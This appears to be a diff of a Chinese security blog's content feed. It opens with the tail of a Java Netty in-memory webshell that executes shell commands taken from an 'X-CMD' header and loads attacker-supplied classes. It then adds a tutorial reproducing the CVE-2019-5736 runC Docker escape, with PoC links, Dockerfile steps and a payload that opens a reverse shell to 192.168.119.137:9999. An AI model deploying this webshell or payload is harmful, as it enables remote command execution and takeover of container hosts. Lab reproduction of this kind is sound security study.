class_">ByteArrayOutputStream</span>());</span><br><span class="line">                requestThreadLocal.set(simpleEntry);</span><br><span class="line">                <span class="keyword">if</span>(httpRequest.headers().contains(<span class="string">&quot;X-CMD&quot;</span>)) &#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> httpRequest.headers().get(<span class="string">&quot;X-CMD&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">execResult</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    ArrayList&lt;String&gt; cmdList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">                    <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                        cmdList.add(<span class="string">&quot;cmd.exe&quot;</span>);</span><br><span class="line">                        cmdList.add(<span class="string">&quot;/c&quot;</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        cmdList.add(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">                        cmdList.add(<span class="string">&quot;-c&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    cmdList.add(cmd);</span><br><span class="line">                    String[] cmds = cmdList.toArray(<span class="keyword">new</span> <span class="title class_">String</span>[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">                    <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(cmds).start();</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line">                    <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(inputStream, <span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">                    String line;</span><br><span class="line">                    <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                        execResult =execResult+line;</span><br><span class="line">                    &#125;</span><br><span class="line">                    process.destroy();</span><br><span class="line">                    send(ctx, execResult, HttpResponseStatus.OK);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (httpRequest.headers().contains(<span class="string">&quot;X-GZ&quot;</span>)) &#123;</span><br><span class="line">                    <span class="type">HttpContent</span> <span class="variable">httpContent</span> <span class="operator">=</span> (HttpContent)msg;</span><br><span class="line">                    AbstractMap.SimpleEntry&lt;HttpRequest,ByteArrayOutputStream&gt; simpleEntry1 = requestThreadLocal.get();</span><br><span class="line">                    <span class="keyword">if</span> (simpleEntry1 == <span class="literal">null</span>)&#123;</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="type">HttpRequest</span> <span class="variable">httpRequest1</span> <span class="operator">=</span> simpleEntry1.getKey();</span><br><span class="line">                    <span class="type">ByteArrayOutputStream</span> <span class="variable">contentBuf</span> <span class="operator">=</span> simpleEntry1.getValue();</span><br><span class="line"></span><br><span class="line">                    <span class="type">ByteBuf</span> <span class="variable">byteBuf</span> <span class="operator">=</span> httpContent.content();</span><br><span class="line">                    <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> byteBuf.capacity();</span><br><span class="line">                    <span class="type">byte</span>[] requestContent = <span class="keyword">new</span> <span class="title class_">byte</span>[size];</span><br><span class="line">                    byteBuf.getBytes(<span class="number">0</span>,requestContent,<span class="number">0</span>,requestContent.length);</span><br><span class="line"></span><br><span class="line">                    contentBuf.write(requestContent);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (httpContent <span class="keyword">instanceof</span> LastHttpContent)&#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            <span class="type">byte</span>[] data =  x(contentBuf.toByteArray(), <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span> (payload == <span class="literal">null</span>) &#123;</span><br><span class="line">                                payload = defClass(data);</span><br><span class="line">                                gzsend(ctx,x(<span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>], <span class="literal">true</span>),HttpResponseStatus.OK);</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                <span class="type">Object</span> <span class="variable">f</span> <span class="operator">=</span> payload.newInstance();</span><br><span class="line">                                java.io.<span class="type">ByteArrayOutputStream</span> <span class="variable">arrOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.ByteArrayOutputStream();</span><br><span class="line">                                f.equals(arrOut);</span><br><span class="line">                                f.equals(data);</span><br><span class="line">                                f.toString();</span><br><span class="line">                                gzsend(ctx,x(arrOut.toByteArray(), <span class="literal">true</span>),HttpResponseStatus.OK);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">                            ctx.fireChannelRead(httpRequest1);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        ctx.fireChannelRead(msg);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    ctx.fireChannelRead(msg);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                ctx.fireChannelRead(msg);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">send</span><span class="params">(ChannelHandlerContext ctx, String context, HttpResponseStatus status)</span> &#123;</span><br><span class="line">            <span class="type">FullHttpResponse</span> <span class="variable">response</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultFullHttpResponse</span>(HttpVersion.HTTP_1_1, status, Unpooled.copiedBuffer(context, CharsetUtil.UTF_8));</span><br><span class="line">            response.headers().set(HttpHeaderNames.CONTENT_TYPE, <span class="string">&quot;text/plain; charset=UTF-8&quot;</span>);</span><br><span class="line">            ctx.writeAndFlush(response).addListener(ChannelFutureListener.CLOSE);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">gzsend</span><span class="params">(ChannelHandlerContext ctx, <span class="type">byte</span>[] context, HttpResponseStatus status)</span> &#123;</span><br><span class="line">            <span class="type">FullHttpResponse</span> <span class="variable">response</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultFullHttpResponse</span>(HttpVersion.HTTP_1_1, status, Unpooled.copiedBuffer(context));</span><br><span class="line">            response.headers().set(HttpHeaderNames.CONTENT_TYPE, <span class="string">&quot;text/plain; charset=UTF-8&quot;</span>);</span><br><span class="line">            ctx.writeAndFlush(response).addListener(ChannelFutureListener.CLOSE);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)&#123;</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        <span class="keyword">return</span> field.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>漏洞利用</category>
+      </categories>
+      <tags>
+        <tag>技巧</tag>
       </tags>
   </entry>
   <entry>
@@ -1791,6 +1540,272 @@
       <tags>
         <tag>网络安全</tag>
         <tag>总结</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CVE-2019-5736-Docker逃逸RunC漏洞复现</title>
+    <url>/articles/de574863/</url>
+    <content><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p> Docker 是一个开源的应用容器引擎，基于Go 语言并遵从Apache2.0协议开源。 Docker 可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到 Linux 或 Windows 机器上，也可以实现虚拟化。 因为Docker容器是完全使用沙箱机制，Docker逃逸漏洞便成了Docker的漏洞主要利用方式之一。</p>
+<p> Docker逃逸RunC漏洞，在Docker 18.09.2之前的版本中使用了的RunC版本小于1.0-rc6，允许攻击者重写宿主机上的RunC 二进制文件,  从而使得宿主机以root执行命令，从而获取宿主机控制权限。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290912214.jpg" alt="img"></p>
+<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><hr>
+<blockquote>
+<p>  漏洞是指应用软件或操作系统软件在逻辑设计上的缺陷或在编写时产生的错误，这个缺陷或错误可以被不法者或者电脑黑客利用，通过植入木马、病毒等方式来攻击或控制整个电脑，从而窃取电脑中的重要资料和信息，甚至破坏系统。现代化的社会发展为人们设计了自由、共享的网络环境，这促使人们的生活、工作以及学习得到了有效改善，也为网络安全漏洞问题的突显提供了平台。</p>
+</blockquote>
+<h3 id="Docker逃逸RunC漏洞"><a href="#Docker逃逸RunC漏洞" class="headerlink" title="Docker逃逸RunC漏洞"></a>Docker逃逸RunC漏洞</h3><hr>
+<blockquote>
+<p>  CVE-2019-5736是2019年2月11日在oss-security邮件列表披露的runc容器逃逸漏洞。</p>
+<p>  在Docker 18.09.2之前的版本中使用了的runc版本小于1.0-rc6，因此允许攻击者重写宿主机上的runc 二进制文件，因此可以感觉以root的身份执行命令，导致获得宿主机的root权限。</p>
+<p>  利用方式：</p>
+<ol>
+<li>宿主机利用攻击者提供的image来创建一个新的container 。或</li>
+<li>拥有container root权限，并且该container后续被docker exec attach。</li>
+</ol>
+<p>   一句话描述，docker 18.09.2之前的runc存在漏洞，攻击者可以修改runc的二进制文件导致提权。</p>
+<p>   影响：</p>
+<ul>
+<li>docker version &lt;&#x3D;18.09.2 （然而实际测试的结果是docker version 18.09.1失败）</li>
+<li>RunC version &lt;&#x3D;1.0-rc6</li>
+</ul>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290915562.jpg-w331s" alt="docker6"></p>
+<h2 id="相关工具及技术"><a href="#相关工具及技术" class="headerlink" title="相关工具及技术"></a>相关工具及技术</h2><h3 id="Vmware-Workstation"><a href="#Vmware-Workstation" class="headerlink" title="Vmware Workstation"></a>Vmware Workstation</h3><hr>
+<p>VMware Workstation使专业技术人员能够在同一台 PC上同时运行多个基于 x86 的 Windows、Linux 和其他操作系统，从而开发、测试、演示和部署软件。</p>
+<p>借助 VMware Workstation Pro，您可以将多个操作系统作为虚拟机（包括 Windows 虚拟机）在单台 Windows 或 Linux PC 上运行，VMware Workstation Pro 是将多个操作系统作为虚拟机 (VM) 在单台 Linux 或 Windows PC 上运行的行业标准。为任何设备、平台或云环境构建、测试或演示软件的 IT 专业人员、开发人员和企业都可以使用，可大大提升工作效率的高性能工具。开发人员将获得一个扩展性强的工程设计环境。</p>
+<p>VMware Workstation 可在一部实体机器上模拟完整的网络环境，以及可便于携带的虚拟机器，其更好的灵活性与先进的技术胜过了市面上其他的虚拟计算机软件。对于企业的 IT开发人员和系统管理员而言， VMware 在虚拟网路，实时快照，拖曳共享文件夹，支持 PXE 等方面的特点使它成为必不可少的工具。</p>
+<p>VMware Workstation 允许操作系统和应用程序在一台虚拟机内部运行。虚拟机是独立运行主机操作系统的离散环境。在 VMware Workstation 中，可以在一个窗口中加载一台虚拟机，它可以运行自己的操作系统和应用程序。可以在运行于桌面上的多台虚拟机之间切换，通过一个网络共享虚拟机，挂起和恢复虚拟机以及退出虚拟机，这一切不会影响你的主机操作和任何操作系统或者其它正在运行的应用程序。</p>
+<h3 id="Ubuntu"><a href="#Ubuntu" class="headerlink" title="Ubuntu"></a>Ubuntu</h3><hr>
+<p>Ubuntu是一个以桌面应用为主的<strong>Linux</strong>操作系统，其名称来自非洲南部祖鲁语或豪萨语的“<strong>ubuntu</strong>“一词，意思是“人性”“我的存在是因为大家的存在”，是非洲传统的一种价值观。Ubuntu基于<strong>Debian</strong>发行版和Gnome桌面环境，而从11.04版起，Ubuntu发行版放弃了<strong>Gnome</strong>桌面环境，改为Unity。从前人们认为Linux难以安装、难以使用，在Ubuntu出现后这些都成为了历史。Ubuntu也拥有庞大的社区力量，用户可以方便地从社区获得帮助。</p>
+<h3 id="Kali-Linux"><a href="#Kali-Linux" class="headerlink" title="Kali Linux"></a>Kali Linux</h3><hr>
+<p>Kali Linux 是一个基于Debian 的Linux 版本 ,面向专业的渗透测试和安全审计。可以把它理解为一个特殊的Linux发行版，集成了超过了600种精心挑选的渗透测试的工具(如 <strong>Metasploit FrameWork</strong> , <strong>Nmap</strong>等)，供渗透测试和安全设计人员使用，也可称之为平台或者框架。</p>
+<h3 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h3><hr>
+<p>Docker 是一个开源的应用容器引擎，基于Go 语言并遵从Apache2.0协议开源,项目主要代码在2013年开源于 GitHub。它是云服务技术上的一次创新，让应用程序布署在软件容器下的工作可以自动化进行，借此在 Linux 操作系统上，提供一个额外的软件抽象层，以及操作系统层虚拟化的自动管理机制。</p>
+<p>Docker 利用 Linux 核心中的资源分脱机制，例如 cgroups， Linux 核心名字空间（name space），以及AUFS类的UnionFS等技术，对进程进行封装隔离，属于操作系统层面的虚拟化技术。由于隔离的进程独立于宿主和其它的隔离的进程，因此也称其为容器。Docker 在容器的基础上进行了进一步的封装，从文件系统、网络互联到进程隔离等等，极大的简化了容器的创建和维护，使得其比虚拟机技术更为轻便、快捷。Docker 可以在单一 Linux 实体下运作，避免因为创建一个虚拟机而造成的额外负担。传统虚拟机技术是虚拟出一套硬件后，在其上运行一个完整操作系统，在该系统上再运行所需应用进程；而容器内的应用进程直接运行于宿主的内核，容器内没有自己的内核，而且也没有进行硬件虚拟。因此容器要比传统虚拟机更为轻便。</p>
+<p>Docker 和传统虚拟机对比，具有更快的启动速度、更高效的资源利用率、更高的系统支持量、持续交付与部署、更轻松的迁移、更轻松的维护与扩展等优点。</p>
+<p>Docker Hub是Docker提供的一项服务，用于寻找和共享容器镜像。它是世界上最大的容器映像库，其内容来源包括容器社区开发者、开源项目和独立软件供应商（ISV）在容器中构建和发布他们的代码。它是一个在线存储库，Docker 镜像可以由其他用户发布和使用。</p>
+<h4 id="Docker常用命令"><a href="#Docker常用命令" class="headerlink" title="Docker常用命令"></a>Docker常用命令</h4><p><strong>dockr images</strong>           列出本地镜像</p>
+<p><strong>docker ps</strong>             查看当前运行的容器</p>
+<p><strong>docker ps -a</strong>            查看全部容器</p>
+<p><strong>docker pull  NAME[:TAG]</strong>     从镜像仓库中拉取或者更新指定镜像</p>
+<p><strong>docker restart  container_id</strong>     重启容器</p>
+<p><strong>docker build -f Dockerfile_PATH</strong>   docker build 命令用于使用 Dockerfile 创建镜像。</p>
+<p><strong>docker run [OPTIONS] IMAGE [COMMAND] [ARG…]</strong></p>
+<p><strong>OPTIONS 说明:</strong></p>
+<p><strong>-d:</strong> 后台运行容器，并返回容器ID</p>
+<p><strong>-p:</strong> 指定端口映射，格式为：主机(宿主)端口:容器端口</p>
+<p><strong>–name</strong> “名称 “ : 为容器指定一个名称；</p>
+<h3 id="Golang"><a href="#Golang" class="headerlink" title="Golang"></a>Golang</h3><hr>
+<p>Go语言（也称为Golang）是google在2009年推出的一种编译型编程语言。 相对于大多数语言，golang具有编写并发或网络交互简单、丰富的数据类型、编译快等特点，比较适合于高性能、高并发场景。 … golang正是由一个强大团队利用这20%时间开发的。</p>
+<h4 id="Golang-常用命令"><a href="#Golang-常用命令" class="headerlink" title="Golang 常用命令"></a>Golang 常用命令</h4><p>build: 编译包和依赖。</p>
+<p>run: 编译并运行go程序。</p>
+<p>clean: 移除当前源码包里面编译生成的文件。</p>
+<p>fmt: 运行gofmt进行格式化。</p>
+<p>get: 下载并安装包和依赖。</p>
+<p>install: 编译并安装包和依赖。</p>
+<p>list: 列出包。</p>
+<p>version: 显示当前环境安装go的版本</p>
+<h4 id="交叉编译"><a href="#交叉编译" class="headerlink" title="交叉编译"></a>交叉编译</h4><ul>
+<li><strong>多平台 ( <code>交叉编译</code> )</strong></li>
+</ul>
+<p><strong>一、Mac 下编译 Linux 和 Windows 64位可执行程序</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CGO_ENABLED=0 </span><br><span class="line">GOOS=linux </span><br><span class="line">GOARCH=amd64 </span><br><span class="line">go build main.go</span><br><span class="line">  </span><br><span class="line">CGO_ENABLED=0 </span><br><span class="line">GOOS=windows </span><br><span class="line">GOARCH=amd64 </span><br><span class="line">go build main.go</span><br></pre></td></tr></table></figure>
+
+<p><strong>二、Linux 下编译 Mac 和 Windows 64位可执行程序</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CGO_ENABLED=0 </span><br><span class="line">GOOS=darwin </span><br><span class="line">GOARCH=amd64 </span><br><span class="line">go build main.go</span><br><span class="line">  </span><br><span class="line">CGO_ENABLED=0 </span><br><span class="line">GOOS=windows </span><br><span class="line">GOARCH=amd64 </span><br><span class="line">go build main.go</span><br></pre></td></tr></table></figure>
+
+<p><strong>三、Windows 下编译 Mac 和 Linux 64位可执行程序</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SET CGO_ENABLED=0</span><br><span class="line">SET GOOS=darwin</span><br><span class="line">SET GOARCH=amd64</span><br><span class="line">go build main.go</span><br><span class="line">  </span><br><span class="line">SET CGO_ENABLED=0</span><br><span class="line">SET GOOS=linux</span><br><span class="line">SET GOARCH=amd64</span><br><span class="line">go build main.go</span><br></pre></td></tr></table></figure>
+
+<p><code>GOOS</code>：目标平台的操作系统（darwin、freebsd、linux、windows） GOARCH：目标平台的体系架构（386、amd64、arm） 交叉编译不支持 CGO 所以要禁用它</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="安装Ubuntu-16-04"><a href="#安装Ubuntu-16-04" class="headerlink" title="安装Ubuntu 16.04"></a>安装Ubuntu 16.04</h3><hr>
+<p>首先从官网下载镜像 ,</p>
+<p>下载地址: <a href="https://releases.ubuntu.com/16.04/">https://releases.ubuntu.com/16.04/</a></p>
+<p>使用 Vmware Workstation 虚拟机进行安装</p>
+<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290916928.png" alt="image-20211201133831599"></p>
+<p>安装完毕, 会自动安装 Vmware-tools</p>
+<p>如若没有 , 可以手动进行安装 , 详情参考 <a href="https://docs.vmware.com/cn/VMware-Tools/11.3.0/com.vmware.vsphere.vmwaretools.doc/GUID-C48E1F14-240D-4DD1-8D4C-25B6EBE4BB0F.html">vmware 官方文档</a></p>
+<p>[+] <strong>官方文档 :</strong>  <a href="https://docs.vmware.com/cn/VMware-Tools/11.3.0/com.vmware.vsphere.vmwaretools.doc/GUID-C48E1F14-240D-4DD1-8D4C-25B6EBE4BB0F.html">https://docs.vmware.com/cn/VMware-Tools/11.3.0/com.vmware.vsphere.vmwaretools.doc/GUID-C48E1F14-240D-4DD1-8D4C-25B6EBE4BB0F.html</a></p>
+<ul>
+<li><strong>Ubuntu、Debian 及相关操作系统</strong></li>
+</ul>
+<ol>
+<li><p>请确保已更新软件包索引：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>如果虚拟机具有 GUI（X11 等），请安装或升级<br>open-vm-tools-desktop：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install open-vm-tools-desktop</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>否则，请使用以下命令安装<br>open-vm-tools：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install open-vm-tools</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="安装Docker-环境"><a href="#安装Docker-环境" class="headerlink" title="安装Docker 环境"></a>安装Docker 环境</h3><hr>
+<blockquote>
+<p>  <strong>Linux 环境</strong>:  Ubuntu 16.04</p>
+</blockquote>
+<blockquote>
+<p>  <strong>docker 版本</strong></p>
+<ul>
+<li>docker version &lt;&#x3D;18.09.2</li>
+<li>RunC version &lt;&#x3D;1.0-rc6</li>
+</ul>
+</blockquote>
+<h4 id="脚本搭建过程"><a href="#脚本搭建过程" class="headerlink" title="脚本搭建过程"></a><strong>脚本搭建过程</strong></h4><blockquote>
+<p>  (支持<strong>Ubuntu</strong> 和 <strong>CentOS</strong>) </p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl https://gist.githubusercontent.com/thinkycx/e2c9090f035d7b09156077903d6afa51/raw -o install.sh &amp;&amp; bash install.sh</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="手工搭建过程"><a href="#手工搭建过程" class="headerlink" title="手工搭建过程"></a><strong>手工搭建过程</strong></h4><p>Ubuntu</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -fsSL https://get.docker.com -o get-docker.sh &amp;&amp; \</span><br><span class="line">sudo VERSION=18.06.0 sh get-docker.sh</span><br></pre></td></tr></table></figure>
+
+<p>1、更新索引包</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get update</span><br></pre></td></tr></table></figure>
+
+<p>2、安装以下包，以使 apt 可以通过 https 使用 repository</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get install -y apt-transport-https ca-certificates curl software-properties-common</span><br></pre></td></tr></table></figure>
+
+<p>3、添加Docker官方的GPG密钥并更新索引包</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -` `</span><br><span class="line">$ sudo apt-get update</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>安装指定的docker版本</li>
+</ul>
+<p>1、列出可用版本</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-cache madison docker-ce</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290917408.png" alt="image-20211206140408904"></p>
+<p>2、选择一个版本来安装</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get install docker-ce=&lt;VERSION&gt;</span><br><span class="line">比如： $ sudo apt-get install docker-ce=18.06.1~ce~3-0~ubuntu</span><br></pre></td></tr></table></figure>
+
+<p>3、查看是否安装正常</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo systemctl start docker` `$ docker info</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="配置GoLang环境"><a href="#配置GoLang环境" class="headerlink" title="配置GoLang环境"></a>配置GoLang环境</h3><hr>
+<h4 id="安装Golang"><a href="#安装Golang" class="headerlink" title="安装Golang"></a>安装Golang</h4><p>apt安装</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt install golang</span><br></pre></td></tr></table></figure>
+
+<p>官网 源码 编译安装</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>先拉取 一个容器 例如 &#x3D;&#x3D;Ubuntu 16.04&#x3D;&#x3D; </p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> docker pull ubuntu:16.04</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290916939.png" alt="image-20211022222251029"></p>
+<p>启动容器</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> docker run -d -it b6</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290917870.png" alt="image-20211022222830729"></p>
+<p>这里通过 exec 命令模拟 黑客 获取到容器的root权限的shell</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> docker <span class="built_in">exec</span> -it 35 bash</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290917219.png" alt="image-20211022223004305"></p>
+<h3 id="复现方式一"><a href="#复现方式一" class="headerlink" title="复现方式一"></a>复现方式一</h3><p>使用poc进行攻击，github 项目地址:</p>
+<p><a href="https://github.com/Frichetten/CVE-2019-5736-PoC">https://github.com/Frichetten/CVE-2019-5736-PoC</a></p>
+<p>循环等待 runC init的 PID -&gt; open(“&#x2F;proc&#x2F;pid&#x2F;exe”，O_RDONLY) -&gt; execve()释放 runC的IO并覆盖runC二进制文件 -&gt; execve()执行被覆盖 runC</p>
+<p>修改payload</p>
+<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> payload = <span class="string">&quot;#!/bin/bash \n /bin/bash -i &gt;&amp; /dev/tcp/192.168.119.137/9999 0&gt;&amp;1&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290917901.png" alt="image-20211206150536431"></p>
+<p>修改poc , bash 也可getshell</p>
+<p>修改payload, 编译poc</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">go build main.go</span><br></pre></td></tr></table></figure>
+
+<p>上传 , 执行poc文件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290917173.png" alt="image-20211022223803309"></p>
+<p>此时, 如果用户从宿主机通过exec命令进入容器内容 , 就能成功触发poc</p>
+<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290917438.png" alt="image-20211022224107696"></p>
+<p>攻击机成功收到 反弹shell</p>
+<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290917091.png" alt="image-20211022224359412"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查看 ip , 确定shell 来自宿主机</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290918481.png" alt="image-20211022224302900"></p>
+<h3 id="复现方式二"><a href="#复现方式二" class="headerlink" title="复现方式二"></a>复现方式二</h3><p>构造有漏洞的容器镜像, 完成漏洞复现</p>
+<p>GitHub 地址: <strong><a href="https://github.com/twistlock/RunC-CVE-2019-5736">https://github.com/twistlock/RunC-CVE-2019-5736</a></strong></p>
+<p>思路: 研究人员通过欺骗runC init execve -&gt; runc 执行&#x2F;proc&#x2F;self&#x2F;exe -&gt; &#x2F;proc&#x2F;[runc-pid]&#x2F;exe覆盖runC 二进制文件</p>
+<blockquote>
+<p>  Dockerfile文件</p>
+</blockquote>
+<p>1.获取libseccomp文件并将run_at_link文件加入，runC启动运行libseccomp。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ADD run_at_link.c /root/run_at_link.c</span><br><span class="line">RUN set -e -x ;\</span><br><span class="line">    cd /root/libseccomp-* ;\</span><br><span class="line">    cat /root/run_at_link.c &gt;&gt; src/api.c ;\</span><br><span class="line">    DEB_BUILD_OPTIONS=nocheck dpkg-buildpackage -b -uc -us ;\</span><br><span class="line">    dpkg -i /root/*.deb</span><br></pre></td></tr></table></figure>
+
+<p>2.overwrite_runc添加docker中并编译 3.使入口点指向runc</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RUN set -e -x ;\</span><br><span class="line">    ln -s /proc/self/exe /entrypoint</span><br><span class="line">ENTRYPOINT [ &quot;/entrypoint&quot; ]</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>  run_at_link文件</p>
+</blockquote>
+<p>1.run_at_link read runc binary 获得fd</p>
